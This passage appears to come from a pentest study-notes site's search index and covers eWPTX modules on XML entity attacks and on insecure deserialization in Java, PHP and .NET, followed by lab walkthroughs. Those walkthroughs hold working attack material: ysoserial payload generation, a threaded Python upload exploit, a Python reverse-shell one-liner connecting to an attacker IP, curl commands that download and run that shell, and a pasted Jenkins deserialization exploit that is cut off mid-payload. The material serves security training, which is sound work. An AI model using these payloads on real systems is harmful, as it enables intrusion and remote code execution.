\"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt; &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt; &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;   Run an XXE attack to read the log file and clear useless text.      [NOTE] Due to some restrictions, to prevent XEE attacks, long URLs might break the payload. To bypass this limitation, we can move the payload in another external dtd as we did before.    Encode the log path:  %7B%5B_%C4%BF.%C3%B2.%C4%9D.%C5%9B_%5D%7D%2F%F0%9D%95%86%E3%8E%8E%E2%80%A6%C3%A0%E2%80%A2d%F0%9D%93%B8s.%E3%8F%92   Extract the content from the result. Use awk or gawk, depends on the system:  gawk 'match($0, /&lt;b&gt;XXEME (.*)&lt;\\\\\\/b&gt;\\s/, m) { print m[1] }'   Remove JSON escaping characters:  sed 's/\\\\\\//\\//g'   Useful Files:  exploit.sh exploit_xxe.sh external_dos.dtd evil_remote_xee.dtd   *XEE DoS *  file: exploit.sh ./exploit.sh   *XXE log file extraction *  file: exploit_xxe.sh ./exploit_xxe.sh  ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/xmlattacks/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser10.jpg"
      },{
        "title": "10 - Attacking Serialization",
        "excerpt":"  Attacking Serialization      What is Serialization?   Serialization in Java   Serialization in PHP   .NET Serialization   Other Serialization   By the end of this module, u should have a better understanding of:      Serialization mechanims   How to find and exploit untrusted deserialization in common web technologies   What is Serialization  Serialization is the name of the mechanims that allows us to store the state of programmistic objects in a sequence of bytes in a reversible way. This way, an object (a variable, set of variables, or even a whole class) can be transported remotely to another program.      The receiving endpoint should be able to recronstruct (deserialize) the received object in an unchanged state.   Used For:  → Storing and transferring data → Calling remote procedures (RPC-like methods)      Serialized data itself is not encrypted or signed in any way.   There might be transport protocols that utilize serialization together with compression and encryption.   So serialized data might be hidden, secured or encoutered in a plain form.      Serialized objects are most often encountered in web apps written in PHP, Java and .NET, but serialization is not limited to these languages only.    Serialization in Java  Install JDK:     https://www.oracle.com/technetwork/java/javase/downloads/jdk11-downloads-5066655.html   Install JRE:          https://www.oracle.com/technetwork/java/javase/overview/index.html            javac = Java commandline compiler       create two files:  - item.java # that holds the code For a class names item - Serialize.java # which contain the serialization logic   Creating Serialized Objects  In order to use serialization, the program must import the java.io.Serializable package. Moreover, For the class to be serialized, it must implement a Serializable interface.         item.java is a class that has two fields: id and name   in real-life, serializable classes can contain many fields and methods.   So, in another file (in java one class should be contained in one file) that will make use of that class. First, it will create an instance of the item class, and then serialize that instance as well as save it to a file.         It converts the instance of the item class to a Stream of Bytes   then its saved to a file caled data.ser   the data.set is in binary format, but we can see some non-ASCII characters   The file begins with:  'ac ed 00 05' bytes, which is a standard java serialized format signature      When used in web applications, its often encoded using Base64 The binary value of ac ed 00 05 equals rO0AB==    Deserializing Data  After compilation and running the Deserialize class, we can see that the object was properly reconstructed   If we change anything from the data.ser file and then try to Deserialize an error occurs  java.lang.ClassNotFoundException: Itxm      Insecure Deserialization Conditions  When serializing and deserializing data, the deserializing endpoint must know (it must include in its classpath or import) all the classes and packages that the serialized object consists of.      Basically, attacking java serialization is about passing the malicious state of an object to the deserializing endpoint.   Example: Executing OS commands in java:  Java.lang.Runtime.getRuntime.exec('whoami')   Properties and Reflection: An objects properties in their simplest form are spotted in the formar:  Object.one.two # two is a property of one # one is a property of Object   Java.lang.Runtime.getRuntime.exe('id') # method exec('id') is a property of getRuntime # which is a property of Java.lava.Runtime      During deserialization, the objets properties are accessed recursively, leading to code execution at the very end of this process.   → Reflection: https://www.oracle.com/technical-resources/articles/java/javareflection.html      Can be recognized by the opaque calling order in the code       A potentially exploitable condition in Java occurs when readObject() or sia similar function is called on user-controlled object and later, a method on that object is called.    An attacker is able to craft an object containing multiple, nested properties, that upon method call will do something completely different   Implementing a Dynamic Proxy:  https://www.baeldung.com/java-dynamic-proxies   Invocation handler:  https://www.concretepage.com/java/dynamic-proxy-with-proxy-and-invocationhandler-in-java   Gadgets  Every property or method that is part of a nested exploit object is called a gadget      gadgets libraries are some java libraries that were identified to contain gadgets used to build serialized exploit objects.   It was first presented as:  https://frohoff.github.io/appseccali-marshalling-pickles/   Does not mean that gadgets libraries are insecure, it means that an attacker can abuse them to construct a known gadget chain that will result in seccessful exploitation.   There is a tool called ysoserial that can be used to perform exploitation of insecure java deserialization vulnerabilties.  https://github.com/frohoff/ysoserial   Introduction to Ysoserial  It can be downloaded along with the source code and a precompiled .jar file      https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar   Usage:  java -jar ysoserial.jar //displays the help message   Often we need to convert the output to Base64 in order to be able to send it to an application.  java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 \"whoami\"      This command generates a serialized payload, that upon being insecurely deserialized by an application that includes CommonCollections1 in its classpath, will result in executing the command whoami    Additions to Ysoserial:      Several Burpsuite Pro extensions have been developed in order to make java serialization detection and exploitation easier.   Such as:  Freddy, Deserialization Bug Finder: # https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3  Java Deserialization Scanner: # https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae   brute-Force Attack with Ysoserial  When approaching an application that utilizes serialized java data, we dont know what libraries are used by the backend.      In this case, brute-force approach might work. We can generate all possible Ysoserial payloads and the try each of them against the target software         The script will run and create a Base64-encoded serialized payload For each vulnerable library. The result files can be further used in Burp Intruder Attacks    Exploring Ysoserial  Each of the .java files can be run as a separate java class, resulting in executing different code by the Ysoserial tool.      Its possible to select and invoke a single method out of a jar archive   With the command line java utility:  -cp (classpath) argument      The classpath contains all locations where the java virtual machine will look For methods available For the process runtime. In that case, we need to specify the Ysoserial .jar file as the classpath.   Inside the the package Ysoserial there is a folder exploit that contains several classes. Each of these classes contain an exploit utility   Example ysoserial/exploit/JSF.java:  java -cp ysoserial.jar ysoserial.exploit.JSF   The JSF payload can be used to attack serialization in Java Faces VIEWSTATE parameter.      Keep in mind, that we omit the .java extension, which is assumed by default by the java environment.    Exploiting Java Deserialization  → https://github.com/NickstaDB/DeserLab  # run the server and client # open wireshark to sniff the network  # server: Java -jar DeserLab.jar -server 127.0.0.1 6666  # try to connect with netcat: nc 127.0.0.1 6666     We can see that the server received our connection   Lets try to connect with the DeserLabs client:  java -jar DeserLab.jar -client 127.0.0.1 6666      In wireshark we can see Java serialized data in the communication   Save the wireshark dump as deserialization.pcap   Deciphering Serialized Data  In order to automate revision of all packages sent:  tshark tool # it can extracted the serialization stream  # syntax: tshark -r deserialization.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^6666,' | cut -d',' -f2 | -tr '\\n' ':' | sed s/://g   For every object/value transported in Java serialized data, there is a predecing byte of certain value that identifies its type      We can inspect any Java Serialized stream to identify the object it contains using the Java Serialization Dumper tool  https://github.com/NickstaDB/SerializationDumper      The tool takes  a hex representation of serialized bytes and dumps the objects the byte stream consists of.         The tool dumps every object that is contained with the serialized stream    Injecting Serialized Payload  We will build a python script that mimic the initial serizalized handshake (0xaced0005) and then replace the serialized data (in this case the string hash with the Ysoserial payload and hope For code execution)      Based on the output of Serialization Dumper, part of the communication must be mimicked using python; this includes the handshake, two TC_BLOCKDATA structures and the username   Further down our exploit the hashed string will be replaced with serialized data originating from the Ysoserial tool   In this case the Groovy library is chosen since its utilized by DeserLab.  java -jar ysoserial-master-SNAPSHOT.jar Groovy1 \"ping 127.0.0.1\" &gt; p.bin   The payload contains the java serialization signature in the beginning. Since the serialized conversation is already started, we should remove it from the payload.      As previously mentioned, it contains all structures dumped by the SerializationDumper tool until the hashed string, which is replaced by the Ysoserial payload without its first 4 bytes (aced0005)   Lets now listen to any ICMP packets on the loopback (127.0.0.1) interface while attacking the DeserLab server using our freshly prepared exploit.  tcpdump -i lo icmp python serialization.py      The server received the connection and ping was executed    Analysis of URLDNS Payload  URLDNS is a payload from Ysoserial. It does not result in code execution      Instead, it makes the deserializing endpoint resolve an arbritary DNS name.   It has low impact, but on the other hand it uses Java built-in features, so its likely to work almost in every case.   https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java   We can observe a gadget chain of 4 objects   Gadget Chain:  HashMap.readObject()   HashMap.putVal()     HashMap.hash()       URL.hashCode()   *HashMap.readObject()** causes Java to instantiate the deserialized object upon successfull deserialization. The hashmap contains a hashed URL object, which due to java built-in mechanisms, will be arbritraty resolved.      Its crafted in the public method getObject   HashMap is a Java data type that stored data in key-value pairs, its often used in deserialization exploits   First, SilentURLStreamHandler is used in order not to resolve the URL upon creation of the serialized object. The url variable is the user-supplied url to be resolved.      line 55, a new HashMap is defined   then, a data type java.net.URL is assigned to the Hashmap, to key u   next, the hashCode of the URL is calculated. Upon, deserialization, the URL in which the hashCode was calculated will be resolved resulting in arbitrary DNS resolution.   Arbitrary DNS Resolution Exploit  The payload is generated to the p.bin file, which was previously used to execute ping  java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://somethingnonexistent.com &gt; DeserLab/DeserLab-v1.0/p.bin      If u have Burp Suite Pro, u can use the Collaborator Client in order to generate and catch DNS requests    DNSChief will be used as a simple DNS proxy. You can clone it from its GitHub repository:  https://github.com/iphelix/dnschef   Add to the /etc/resolv.conf  nameserver 127.0.0.1   Start the DNSChief and verify if its working properly by trying to ping a non-existent domain:  ping oahsdhuasdo.com           Now we can execute the payload (p.bin) and see if the lookup is performed       URLDNS payloads can be used to detect deserialization issues before you can try to attack them with full-RCE payloads   Ysoserial payloads that results in code execution rely on similarly nested objects, however, they can be a lot more complicated and involve several objects and their properties   Troubleshooting Ysoserial  In order to be able to confirm whether the application is secure or not, you shoudl be familiar with the exception types that can be thrown during the attacking process.      Ysoserial is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface   When attacking, u should be aware of where the exception comes from. Ysoserial itself prints verbose stack traces when used incorrectly   When reading the stack trace, if u encounter a ClassNotFoundException, its likely that the target application does not utilize the gadget library used by the usoserial payload. You can then try to use a different payload that targets another library      If you encountered java.io.IOException with the message Cannot run program, this is a good sign because your payload worked. However, the app u wanted to call is unavailable For some reason (example: it doesnt exist)   When telling ysoserial to create an RCE-related payload, you should be aware of its limitations:      Output redirections and pipes are not supported   Parameters to the command cannot contain spaces; so, while:     nc -lp 4444 -e /bin;sh# is ok python -c import socket;... # will not work because the parameter (import socket) to Python contains a space           Spotting Java Serialized Objects  Pay attention to binary data, especially if its starts with:  \"aced0005\" hex \"rO0aB\"    base64 looks like a list of java classes (eg \"org.apache.somethig\", \"java.lang.String\") # Presence of such data may indicate that the target application is deserializing custom data.   Recommended Reading  - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet - https://github.com/Coalfire-Research/java-deserialization-exploits - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md - https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/   Serialization in PHP  AKA PHP Object Injection      PHP uses serialize() and unserialize() functions to store, transfer and transform whole objects.   Unlike Java, PHP Serialization is in non-binary format, looks similar to a JSON array and its human-readable.   looks like:  0:6:6\"Abcdef\":1:1{s:9:\"Something\";s:6:\"Active\";}   For example:  Booleans are serialized as 'b:&lt;i&gt;;' # where i is 0 or 1 (true/false)  Strings are serialized as 's:&lt;i&gt;:\"&lt;s&gt;\";' # where is is the string length and s is the string itself  Arrays are serialized as 'a:&lt;i&gt;:{&lt;elements&gt;}' # where i is an integer representing the number of elements in the array, and elements are zero or more serialized key value pairs of the following form, '&lt;key&gt;&lt;value&gt;'  Objects (classes) are serialized as 'O:&lt;i&gt;:\"&lt;s&gt;\":&lt;i&gt;:{&lt;properties&gt;}' # where the first &lt;i&gt; is an integer representing the string length of &lt;s&gt; and &lt;s&gt; is the fully qualified class name   ⇒ the second &lt;i&gt; is an integer representing the number of object properties, and &lt;properties&gt; are zero or more serialized name-value pairs   ⇒ In the &lt;name&gt;&lt;value&gt; pair, &lt;name&gt; is a serialized string representing the property name, and &lt;value&gt; is any value that is serializable   ⇒ Also, &lt;name&gt; is represented as 's:&lt;i&gt;:\"&lt;s&gt;\";' where &lt;i&gt; is an integer representing the string length of &lt;s&gt;  The visibility of properties influences the value of &lt;s&gt; in the following ways:   ⇒ With public properties, &lt;s&gt; is the simple name of the property   ⇒ With protected properties, &lt;s&gt; is the simple name of the property, prepended with \\0*\\0 - an asterix enclosed in two NULL bytes (0x00)   ⇒ With private properties, &lt;s&gt; is the simple name of the property, prepended with \\0&lt;s&gt;\\0 - &lt;s&gt; and enclosed in two NULL bytes, where &lt;s&gt; is the fully qualified class name   Moreover PHP serialized data format  → http://www.phpinternalsbook.com/php5/classes_objects/serialization.html   → https://www.geeksforgeeks.org/php-serializing-data/      You might often encounter the PHP serialized data to be Base64 encoded For transportation purposes. Never leave any Base64 data uninspected.    Magic Methods  They are functions that are being launched dynamically once a certain trigger is present. They can be recognized in code by two underscores in the beginning of their names, For example:, __construct()   The triggers For the PHP classes are:  __construct() is loaded upon creating a new instance of a class __destruct() is loaded when no more references of a current class are present in memory __wakeUp() is loaded upon deserializing an object  Moreover   → https://www.php.net/manual/en/language.oop5.magic.php         First lets create a history.lol file:  touch history.lol      Lets change the $serialize variable from history.log to history.lol. As the filename length is the same, we do not need to change the string length information in the serialized data.      We can observe the destructor function to be run on the history.lol file, which was removed. This way, we were able to manipulate serialized PHP data in order to alter the original behavior of the file.    In this example, serialized data was passed in a variable to simplify the example   in the real world, such data often comes from other sources, For example:  HTTP requests parameters   Exploitation of such vuln was possible because:  - We had access to the source code, so we knew what the script exactly does - We had access to the original serialized payload, so we knew what to alter in it - The vuln function was implemented in the default destructor, so the data was used after the deserialization. There could be a case when data is unserialized but not used in an insecure manner.   Unserialization logic added to the code:      Upon deserialization, the class magic methods will be run so that the file will be removed in the destructor function:      .NET Serialization     It uses a few different mechanisms For serialization and de-serialization of data. Data serialized using one of these mechanisms must be de-serialized using the same one.   .NET Serialization Types  Saving the states of objects using serialization in .NET can be done using various methods:  - BinaryFormatter - DataContractSerializer - NetDataContractSerializer - XML Serialization   BinaryFormatter serialized data to a binary file, and data serialized using XML Serialized is in human-readable, XML format      Usage of them is situational and connected to .NET internals.   We are going to see the use of Ysoserial.net, which is similar to the java one.   BinaryFormmater example:  - The app serialized a string and writes the output to a file - The file is in binary format, as the name implies   After running the application we can inspect the serialized data in the file. Indeed, its in binary format.  type data.dat      You can expect serialized .NET data encountered in web apps to be Base64 encoded in order to conveniently send non-ASCII characters in HTTP requests and responses.   Spotting .NET Serialized Data  A common, but not the only place where serialized data can be foudn is when data is sent in a VIEWSTATE parameter, or .NET remoting services.      .NET remoting services can be considered part of the web application world but they are also part of the infrastructure   .NET remoting is the mechanics that allow sending pure .NET objects via TCP; however, depending on the application infrastructure, web applications may provide a layer of transport to supply data destined to a .NET remoting endpoint.   Examples of exploiting .NET remoting via HTTP:  → https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/   → https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/   VIEWSTATE  Its a web parameter that is used in the majority of .NET web apps in order to persist the state of the current web page   Viewstate is the state of the page and all its controls. Its automatically maintened across the web app by the ASP.NET framework      When a page its sent back to the client, the changes in the properties of the page and its controls are determined, and then, they are stored in the value of a hidden input field name __VIEWSTATE   With every other POST request, the __VIEWSTATE field is sent to the server together with other parameters   Countermeasures against VIEWSTATE tampering  MAC Enabled option - the viewstate is signed with a cryptographic key known only by the server-side. Its configured by the following setting/option:  &lt;page enableViewStateMac=\"true\" /&gt;      In web.config or setting MAC validation in IIS manager, the latest .NET framework uses MAC validation by default   if the key is hardcoded, it might be leaked as a result of file read vulnerabilities like XXE, File inclusion or similar   Its possible to encrypt the viewstate by configuring the web config:  &lt;page ViewStateEncryptionMode=\"Always\"/&gt;      this can be done via the IIS management console too    In order to enable the Windows server IIS, go to:  Control Panel &gt; Programs &gt; Turn windows features on or off Select Internet Information Services (IIS)  # The files served by the IIS will be present in the standard directory: c:\\inetpub\\wwwroot      If u set up the server correctly - restart the pc and go to http://127.0.0.1   open burp to observe the HTTP traffic   In the wwwroot directory, we will create 3 files:  - hello.aspx (the frontend logic) - hello.aspx.cs (backend) - web.config (the IIS standard config file)            The result is a text area, when u click the button the text that u wrote is displayed      The web.config file instructs the web server not to require MAC validation of the __VIEWSTATE parameter   This allow us to tamper with the parameter and the server will try to deserialize it anyway   Test BURP  Go to the page, click in the button with some text and capture that on BURP      Send the request to Repeater and navigate to ViewState tab in Burp   Burp displays information that MAC is not enabled!   Lets generate a payload using ysoserial.net and put it into the viewstate parameter. The payload will perform a simple HTTP request, since this is the appropriate approach before trying more specific RCE payloads  ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c \"powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd\"   We can see that the netcat listener received a request from Windows Powershell:  nc -lvnp 9000   The server response contains the 500 error code; Howeverm powershell is executed. Using the Process Hacker tool we can confirm that indeed IIS spawned the powershell process      We have achieved RCE via .NET VIEWSTATE deserialization    2nd test - The .cs file was modified      we can now see in BURP that VIEWSTATE parameter is no longer present in the website requests      But if we add the viewstate parameter anyway, the code execution still works      The later is the .NET framework version, the more difficult its to tamper with the viewstate           If MAC validation is enabled, then it could be possible to exploit viewstate-based deserialization only if the MAC key is hardcoded (e.g. web.config)            The current default setting of IIS are to generate the key at runtime, and its different For each app       Moreover:  - https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817 - https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/   2nd exercise - Modify the hello.aspx.cs   Other Serialization  Each dev language has its own deserialization logic and entry points/transportation mechanims of serialized data.      Less popular languages will result in harder exploitation of deserialization vulns, since no automated tools, like ysoserial will exist   Deserialization of untrusted data does not necessarily lead to code execution      You might often be able to view the full code of a target application on github repository    WHen looking FOr this vuln, pay attention to:  - Contains strings that are similar to method names or object names - Contains Binary data - Is in a complex, structured form   Python-based serialization  - https://intoli.com/blog/dangerous-pickles/ - https://lincolnloop.com/blog/playing-pickle-security/   Ruby Insecure Deserialization  - https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html   Generic presentation about all mentioned technologies  - https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf   Examples in Snake YAML  - https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858 - https://blog.semmle.com/swagger-yaml-parser-vulnerability/   Lab 1   Task 1. Perform reconnaissance and identify a vulnerable web application   Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.   Step 2: Scan the network with Nmap and gather the information about the target machine.   Use the following command to get the information about open ports and services in the network.   Command:   nmap demo.ine.local   Got the information about the IP address and the ports which are open in the target machine.   Step 3: Use Dirb to list the directories of the website hosted on the server.   DIRB is a command-line-based tool to brute force any directory based on wordlists.  Command:  dirb http://demo.ine.local/ /usr/share/dirb/wordlists/common.txt   Task 2. Identify exploitable conditions   Step 1: Navigate to the target URL.  Target URL: http://demo.ine.local/upload/   Step 2: Upon entering the page and provide an “index.php?sent=OK” parameter in the end of the URL.   The application tries to read a file named \"data.ser\" but throws a Java-related exception.   Step 3: Create a sample file with the following command.   Command:  echo \"sample text\" &gt; example.txt   Step 4: Navigate to the upload page. The upload page allows uploading a file to an unknown location.      [Note] There is a brief delay before the file is uploaded, which can mean that it is being processed by a kind of back-end logic. Open two tabs on one page with sent=ok at the end and the upload page.    Select the example.txt and click upload then quickly switch the tabs.   Step 5: Upload the file using the upload page and try to read the file.  - The application moves away from any uploaded files once they are processed. To be able to read them on time, one should click the \"Read the file\" button before the upload message is displayed.  - Now if the \"OK\" button at \"Read the file\" is clicked quickly enough (it is best to have it in a separate tab) then the error message changes indicating, that possibly, the file content was deserialized unsuccessfully due to a corrupted format.  - It looks like we have identified an untrusted data deserialization vulnerability, which can only be exploited when the payload file is timely delivered to the application.   Task 3. Achieve code execution   To create an exploit, we will need three things:  1. Ysoserial payloads to try, as we do not know which exactly will work 2. A loop that will constantly try to upload and then read the file 3. A check to identify whether code execution was achieved or not   Step 1: As we have so many payloads in ysoserial tools, we will create a loop with different payloads that will constantly try to upload and then read the file.   To get list of ysoserial payloads, one of the ways can be to copy ysoserial’s output to a file, our is called yso.   Command:  java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar &gt;yso  2&gt;&amp;1 cat yso | tr -d ' ' | cut -d \"@\" -f 1 &gt; payloads.txt sed -i -e '1,7d'  payloads.txt   This commands will save the payload in the yso file and format it to make a payloads list of ysoserial tool and finally save it as payloads.txt.   Command:  cat payloads.txt   The result will look similar to this.   Step 2: Generate a payload for each line of the aforementioned list.      [Note] We are going to ping the IP of the attacker machine not the target machine.    Change the directory to home so that we can list all the payloads easily here.   Command:  cd /home   Use the following command to generate payloads.   Command:  while read payloadname; do java -jar ../root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar $payloadname \"ping 192.91.247.2 -c 3\" &gt; $payloadname; done &lt; payloads.txt   The result will look similar.   Step 3: Construct an exploit in Python that will mimic using the website.   It will need to take a list of payloads (we have them by name, we will shortly turn the list into a list of filenames). Moreover, the exploit will need to issue two requests one after the other - the “upload” one and immediately after it the “read file” one.   In the below examples we are using Python 3. Note we are accessing the target machine website so we need to use that IP address.   The “read file” request might look like the one below.  def readfile(filename):   url = \"http://demo.ine.local/upload/index.php?sent=OK\"   r = requests.get(url)   print(\"[+] Used filename: \" + filename)   print(r.text)   print(\"\\n\")   Then, the “upload_file” request can be similar to the below.  def upload(filename):   url = \"http://demo.ine.local/upload/upload.php\"   files ={'uploaded_file': open(filename, 'rb')}   r = requests.post(url, files=files)   Step 4: We will also need a list of all payload files by their name. Since each file is named after the payload, we can use the “yso” file again to generate a list (as we don’t want to retype it manually).  while read payload; do /root/payloads.txt echo \\'$payload\\', &gt;&gt; /root/p2.txt; done &lt; /root/payloads.txt   The result will look similar.   The list can be pasted directly into a Python program (the last comma after the last payload has to be deleted)   To sequentially run them and then use “read file” immediately, we need to implement the concept of threading. If we simply run the two functions above one after the other, readfile() will wait for upload() until it finishes. By this time, the target file will be gone.   Threading will simply start upload() in another thread which will allow readfile() to run without waiting for the response of upload().  for payload in payloads:   x=threading.Thread(target=upload, args=(payload,))   x.start()   readfile()   time.sleep(2)   Before running the exploit check if you have started a listener to detect pings - e.g. Wireshark or tcpdump.   Command:  tcpdump -i eth1 icmp   Step 5: Copy and paste the code and save it as exploit.py. We can now clear the list in the exploit, so its final shape will be similar to the below.  import requests import time import threading def readfile(filename):   url = \"http://demo.ine.local/upload/index.php?sent=OK\"   r = requests.get(url)   print(\"[+] Used filename: \" + filename)   print(r.text)   print(\"\\n\") def upload(filename):   url = \"http://demo.ine.local/upload/upload.php\"   files ={'uploaded_file': open(filename, 'rb')}   r = requests.post(url, files=files) payloads = [ 'CommonsCollections2' ]  for payload in payloads:   x=threading.Thread(target=upload, args=(payload,))   x.start()   readfile(payload)   time.sleep(2)   Step 6: Execute the exploit code by the following command.   Command:  python exploit.py   The result is code execution!   After a short, while seeing different responses for each payload, we can see that when CommonsCollections2 is used, pings start to appear.   Task 4. Obtain a reverse shell   To establish a reverse shell we will need to issue a command or series of commands. Keep in mind that in Java deserialization, you can use spaces in the commands, but you cannot use spaces in the arguments of the commands.   Step 1: Create a shell script to get the reverse shell from the target machine.   Save this code as rev.py in the root directory.   Code:  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.46.20.2\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'   Step 2: Then let’s host the above using Python’s SimpleHTTPServer module in the directory where rev is present.   Command:  python -m SimpleHTTServer 8443   Step 3: In another terminal window, start a Netcat listener.   Command:  nc -lvp 443   Step 4: Finally, the exploit is changed to generate the respective payloads one after the other.      Download the reverse shell   Make it executable   Start the shell   payload = 'CommonsCollections2' commands = [ '\"curl http://192.91.247.2:8443/rev.py -O rev.py\"', '\"chmod +x rev.py\"', '\"./rev.py\"' ]  for command in commands:   os.system(\"java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar \" + payload + \" \" + command + \" &gt; \" + payload)   x=threading.Thread(target=upload, args=(payload,))   x.start()   readfile(payload)   time.sleep(2)   Below you can find the full exploit code.   Save this as exploit.py and execute the file.   Command:  python exploit.py   Code:  import requests import time import threading import os def readfile(filename):   url = \"http://demo.ine.local/upload/index.php?sent=OK\"   r = requests.get(url)   print(\"[+] Used filename: \" + filename)   print(r.text)   print(\"\\n\")  def upload(filename):   url = \"http://demo.ine.local/upload/upload.php\"   files ={'uploaded_file': open(filename, 'rb')}   r = requests.post(url, files=files) payload = 'CommonsCollections2' commands = [ '\"curl http://192.91.247.2:8443/rev.py -O rev.py\"', '\"chmod +x rev.py\"', '\"./rev.py\"' ]  for command in commands:   os.system(\"java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar \" + payload + \" \" + command + \" &gt; \" + payload)   x=threading.Thread(target=upload, args=(payload,))   x.start()   readfile(payload)   time.sleep(2)       Successfully achieved remote code execution.    Lab 2   Solution   Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.   Step 2: Scan the network with Nmap and gather the information about the target machine.   Use the following command to get the information about open ports and services in the network.   Command:  nmap demo.ine.local   Got the information about the IP address and the ports which are open in the target machine.   Step 3: Inspect the Jenkins application by navigating to the IP address at port 8080 in the web browser.   Target URL:  http://192.24.161.3:8080/   Step 4: Copy and paste the python exploit code and save it as exploit.py.   Source: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py   Code:  #!/usr/bin/python # usage: ./jenkins.py host port /path/to/payload import socket import sys import requests import base64  host = sys.argv[1] port = sys.argv[2]  # Query Jenkins over HTTP to find what port the CLI listener is on r = requests.get('http://' + host + ':' + port) cli_port = int(r.headers['X-Jenkins-CLI-Port'])  # Open a socket to the CLI port sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_address = (host, cli_port) print('connecting to %s port %s' % server_address) sock.connect(server_address)  # Send headers headers = '\\x00\\x14\\x50\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x3a\\x43\\x4c\\x49\\x2d\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74' print('sending \"%s\"' % headers) sock.send(headers) data = sock.recv(1024) print &gt;&gt;sys.stderr, 'received \"%s\"' % data data = sock.recv(1024) print &gt;&gt;sys.stderr, 'received \"%s\"' % data  payloadObj = open(sys.argv[3], 'rb').read() payload_b64 = base64.b64encode(payloadObj) payload='\\x3c\\x3d\\x3d\\x3d\\x5b\\x4a\\x45\\x4e\\x4b\\x49\\x4e\\x53\\x20\\x52\\x45\\x4d\\x4f\\x54\\x49\\x4e\\x47\\x20\\x43\\x41\\x50\\x41\\x43\\x49\\x54\\x59\\x5d\\x3d\\x3d\\x3d\\x3e'+payload_b64+'\\x00\\x00\\x00\\x00\\x11\\x2d\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1b\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x4c\\x00\\x10\\x63\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x50\\x72\\x6f\\x78\\x79\\x74\\x00\\x30\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x3b\\x5b\\x00\\x07\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x02\\x5b\\x42\\x4c\\x00\\x08\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x49\\x00\\x02\\x69\\x64\\x49\\x00\\x08\\x6c\\x61\\x73\\x74\\x49\\x6f\\x49\\x64\\x4c\\x00\\x08\\x72\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x74\\x00\\x1a\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x